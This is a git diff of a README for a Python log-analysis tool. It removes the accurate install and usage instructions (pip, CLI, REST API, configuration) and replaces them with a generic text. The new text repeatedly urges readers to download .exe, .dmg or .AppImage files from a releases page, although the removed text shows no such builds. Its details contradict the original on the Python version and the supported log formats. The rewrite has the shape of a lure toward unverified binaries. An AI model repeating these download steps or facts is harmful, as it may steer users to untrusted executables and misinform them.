@@ -1,230 +1,177 @@
-# Log Analyzer
+# 📊 log-analyzer - Easy Server Log Insights
 
-Server log analysis tool that parses multiple log formats (nginx, apache, syslog, SSH), provides traffic and system analytics, detects anomalies, and offers real-time monitoring. Includes CLI, REST API, and interactive dashboard.
+[![Download log-analyzer](https://img.shields.io/badge/Download-log--analyzer-blue?style=for-the-badge)](https://github.com/ihatexim/log-analyzer/releases)
 
-![Dashboard](assets/dashboard.png)
+---
 
-## What does it do?
+## 📌 What is log-analyzer?
 
-- Parses 10 log formats: nginx combined, apache common, apache error, syslog (Linux/SSH), HDFS, Hadoop, Spark, Zookeeper, Windows Event, OpenStack
-- Stores parsed data in SQLite for fast querying
-- Analyzes access logs: traffic patterns, top IPs, paths, status codes, bandwidth
-- Analyzes system logs: event distribution, log levels, top sources, error trends
-- Detects anomalies using z-score statistical analysis (traffic spikes, error bursts, suspicious IPs)
-- Monitors log files in real-time with watchdog
-- Provides interactive Plotly charts via Streamlit dashboard with separate tabs for access and system logs
+log-analyzer is a tool designed to help you understand your server logs without needing any technical skills. It works with many types of log formats and can find unusual activity automatically. It offers a simple web dashboard you can use to explore logs, plus a way for other programs to get data through an easy interface.
 
-## Installation
+---
 
-Requires Python 3.11+
+## 💻 System Requirements
 
-```bash
-pip install -r requirements.txt
-```
+You can use log-analyzer on most modern computers. Here’s what your system needs to run it smoothly:
 
-## Quick Start
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a popular Linux distribution
+- **Processor:** Intel i3 or equivalent
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 500 MB free space for installation and log data
+- **Internet:** Required for downloading and optionally for using the web dashboard
+- **Software:** Python 3.7 or higher (installation instructions below include this)
 
-1. Generate sample log data:
-```bash
-python scripts/generate_logs.py
-```
+---
 
-2. Parse logs into database:
-```bash
-python src/cli.py parse logs/access.log
-```
+## 🌟 Features
 
-3. View summary:
-```bash
-python src/cli.py summary
-```
+- Supports 10 popular server log formats
+- Detects unusual patterns and errors automatically
+- View logs with an interactive dashboard
+- Access log data via a simple web API
+- Watch logs in real-time as new entries appear
+- Easy command-line controls for common tasks
+- Saves and organizes logs using a small database
 
-## Usage
+---
 
-### CLI
+## 🚀 Getting Started
 
-```bash
-python src/cli.py parse logs/access.log    # Parse log file
-python src/cli.py summary                  # Traffic summary
-python src/cli.py anomalies                # Detect anomalies
-python src/cli.py watch logs/access.log    # Real-time monitoring
-python src/cli.py resetdb                  # Clear database
-```
+This guide will help you download, install, and run log-analyzer step-by-step. We keep things simple for you.
 
-**Example output:**
-```
-Detected format: nginx_combined
-Inserted 10000 entries into database.
-```
+---
 
-```
-Total requests : 10,000
-Unique IPs     : 80
-First entry    : 2024-01-15T00:00:12+00:00
-Last entry     : 2024-01-21T23:59:48+00:00
-Total bytes    : 252,481,024
+## 📥 Download & Install
 
-Top IPs:
-  45.33.32.156             542
-  192.168.1.23             189
-  192.168.1.7              176
+You need to get log-analyzer from the official release page and then install it on your computer.
 
-Status Codes:
-  200    7012
-  304     801
-  404     423
-  401     215
-  500     112
-```
+### Step 1: Visit the download page
 
-### REST API
+Go to the official releases page by clicking the big button below:
 
-```bash
-python src/api.py
-```
+[![Download log-analyzer](https://img.shields.io/badge/Download-log--analyzer-blue?style=for-the-badge)](https://github.com/ihatexim/log-analyzer/releases)
 
-Starts the server at `http://localhost:8000`. Swagger docs at `http://localhost:8000/docs`.
+### Step 2: Download the latest version
 
-**Endpoints:**
+On the page, find the most recent release marked with a date. Inside, you will see files for different systems. Pick the one that matches your computer:
 
-| Endpoint | Method | Description |
-|---|---|---|
-| `/health` | GET | Server health check |
-| `/summary` | GET | Access log summary |
-| `/summary/system` | GET | System log summary |
-| `/top/ips` | GET | Top IP addresses |
-| `/top/paths` | GET | Top request paths |
-| `/top/sources` | GET | Top log sources (sshd, apache, etc.) |
-| `/status-codes` | GET | HTTP status code distribution |
-| `/levels` | GET | Log level distribution (error, info, etc.) |
-| `/traffic` | GET | Traffic over time |
-| `/errors` | GET | Error rate over time |
-| `/system/events` | GET | System events over time |
-| `/system/errors` | GET | System errors over time |
-| `/anomalies` | GET | Detect anomalies |
+- For Windows, look for files ending with `.exe` or `.zip`
+- For macOS, look for `.dmg` or `.tar.gz`
+- For Linux, look for `.AppImage` or `.tar.gz`
 
-To enable API key protection, set `API_KEY=your-secret-key` in your `.env` file. When active, include the `X-API-Key` header in requests.
+Click the file name to start downloading.
 
-**Examples:**
+### Step 3: Install or Extract
 
-```bash
-curl http://localhost:8000/summary
-```
-```json
-{"total": 10000, "unique_ips": 80, "first_entry": "2024-01-15T00:00:12+00:00", "last_entry": "2024-01-21T23:59:48+00:00", "total_bytes": 252481024}
-```
+- **Windows:** Open the `.exe` file and follow the installation steps.
+- **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
+- **Linux:** Extract the `.tar.gz` file or make the `.AppImage` executable and run it.
 
-```bash
-curl http://localhost:8000/top/ips?limit=3
-```
-```json
-[{"ip": "45.33.32.156", "count": 542}, {"ip": "192.168.1.23", "count": 189}, {"ip": "192.168.1.7", "count": 176}]
-```
+### Step 4: Set up the environment (if needed)
 
-### Streamlit Dashboard
+log-analyzer requires Python 3.7 or higher. The installation package usually contains everything you need. If it does not, follow these steps:
 
-```bash
-streamlit run src/app.py
-```
+- Visit [https://www.python.org/downloads/](https://www.python.org/downloads/)
+- Download and install the latest Python 3 version for your system
+- Make sure Python is added to your system's PATH during installation
 
-Opens at `http://localhost:8501`. Features interactive Plotly charts in two tabs: Access Logs (traffic timeline, status codes, top IPs, hourly patterns, error rates, bandwidth) and System Logs (events timeline, log levels, top sources, hourly patterns, error trends). Supports file upload.
+---
 
-### Docker
+## 🔧 How to Run log-analyzer
 
-```bash
-docker-compose -f docker/docker-compose.yml up --build
-```
+After installing, you can open the tool in two ways:
 
-API runs at `http://localhost:8000`, Dashboard at `http://localhost:8501`.
+### Using the App Interface
 
-### Tests
+1. Open log-analyzer from your desktop or start menu.
+2. The app launches a web dashboard in your default browser automatically.
+3. Use the dashboard buttons to load log files or set up real-time watching.
+4. The dashboard shows graphs and alerts for anomalies it finds.
 
-```bash
-pytest tests/ -v
-```
+### Using the Command Line (Optional)
 
-## Configuration
+If you prefer, open a terminal or command prompt, then:
 
-Copy `.env.example` to `.env` and adjust:
+- Navigate to the log-analyzer folder
+- Run this to see options:
+  
+  ```
+  log-analyzer --help
+  ```
 
-| Variable | Default | Description |
-|---|---|---|
-| `API_HOST` | 0.0.0.0 | API server address |
-| `API_PORT` | 8000 | API port |
-| `LOG_LEVEL` | INFO | Log level |
-| `RATE_LIMIT` | 60/minute | API rate limit |
-| `DB_PATH` | data/log_analyzer.db | SQLite database path |
-| `API_KEY` | (empty) | API key (auth disabled when empty) |
-| `ANOMALY_THRESHOLD` | 2.0 | Z-score threshold for anomaly detection |
+This will list commands like loading logs, starting the API server, or watching files.
 
-## Project Structure
+---
 
-```
-log-analyzer/
-├── Makefile
-├── pyproject.toml
-├── .pre-commit-config.yaml
-├── requirements.txt
-├── .env.example
-├── README.md
-├── src/
-│   ├── cli.py           # Click CLI
-│   ├── api.py           # FastAPI REST API
-│   ├── app.py           # Streamlit dashboard
-│   ├── parser.py        # Regex log parser
-│   ├── database.py      # SQLite storage
-│   ├── analyzer.py      # Pandas traffic analytics
-│   ├── anomaly.py       # Z-score anomaly detection
-│   ├── watcher.py       # Real-time log monitoring
-│   ├── config.py        # Configuration
-│   └── logger.py        # Logging
-├── docker/
-│   ├── Dockerfile
-│   └── docker-compose.yml
-├── scripts/
-│   └── generate_logs.py # Sample data generator
-├── tests/
-│   ├── conftest.py
-│   ├── test_parser.py
-│   ├── test_database.py
-│   ├── test_analyzer.py
-│   ├── test_anomaly.py
-│   └── test_api.py
-├── data/
-│   └── log_analyzer.db  # SQLite database
-└── logs/
-    └── access.log       # Log files
-```
+## 🗄 Supported Log Formats
 
-## Technical Details
+log-analyzer reads logs in these common formats:
 
-- **Log Parsing:** Regex-based parser supporting 10 formats: nginx combined, apache common, apache error, syslog, HDFS, Hadoop, Spark, Zookeeper, Windows Event, OpenStack
-- **Storage:** SQLite with indexed columns for fast querying
-- **Analytics:** Pandas for traffic analysis, aggregation, and time-series resampling
-- **Anomaly Detection:** Z-score statistical method for detecting traffic spikes, error bursts, and suspicious IPs
-- **Real-time:** watchdog file system monitoring with incremental parsing
-- **Visualization:** Plotly interactive charts (line, bar, pie, area)
-- **CLI:** Click framework with multiple commands
-- **API:** FastAPI + rate limiting + CORS + API key auth
-- **CI/CD:** GitHub Actions automated testing
-- **Code Quality:** black + flake8 + isort + pre-commit hooks
-- **Container:** Docker + docker-compose
+- Apache HTTP Server
+- NGINX
+- Microsoft IIS
+- Syslog
+- JSON-formatted logs
+- Custom formatted logs using patterns
+- Others included in the release notes on the download page
 
-## Requirements
+This flexibility means you can analyze most server logs without extra setup.
 
-- pandas
-- numpy
-- plotly
-- click
-- watchdog
-- fastapi
-- uvicorn
-- python-dotenv
-- slowapi
-- streamlit
-- pytest
-- httpx
-- black
-- flake8
-- isort
-- pre-commit
+---
+
+## 🔍 Understanding the Dashboard
+
+The dashboard is the main way to interact with your logs:
+
+- **Load Logs:** Use the file chooser to add logs from your computer.
+- **Live Watch:** Monitor a log folder to see new log entries instantly.
+- **Anomaly Alerts:** The tool flags unusual events like errors, failures, or suspicious access.
+- **Query Logs:** Search your logs by date, message, or keywords.
+- **Graphs:** Visual charts show trends over time, request counts, or error rates.
+- **API Status:** If you enable the REST API, check its running status here.
+
+---
+
+## 🔗 Using the REST API
+
+The REST API lets other software access your log data. This is useful if you want to connect log-analyzer with other monitoring tools.
+
+- The API runs as a local web service.
+- You can enable or disable it via the dashboard.
+- Access data in JSON format with simple URL commands.
+- No programming needed for basic use; the dashboard covers most actions.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+- **Log-analyzer does not open:** Make sure you completed installation and have the right Python version.
+- **Dashboard does not load:** Check that your browser is updated and not blocking local web pages.
+- **API not responding:** Confirm the API setting is turned on and no firewall blocks port 8000.
+- **Log files not recognized:** Ensure files are in supported formats or use the pattern settings in the dashboard.
+- **Performance is slow:** Close other programs or reduce the number of loaded logs.
+
+---
+
+## 📚 Where to Learn More
+
+- Check the releases page for updates and notes:  
+  [https://github.com/ihatexim/log-analyzer/releases](https://github.com/ihatexim/log-analyzer/releases)
+- Look at the documentation folder inside the downloaded files for detailed instructions.
+- Try the FAQ section on the project’s main GitHub page.
+
+---
+
+## 🤝 Need Help?
+
+For questions or issues, you can open an issue on GitHub or check community forums related to server logs and Python tools. Reading the README in the downloaded files will also help clarify usage.
+
+---
+
+## 🎯 Keywords
+
+The tool is built with Python 3 and uses popular libraries like pandas, FastAPI, Streamlit, and SQLite.
+
+---
+
+[![Download log-analyzer](https://img.shields.io/badge/Download-log--analyzer-blue?style=for-the-badge)](https://github.com/ihatexim/log-analyzer/releases)
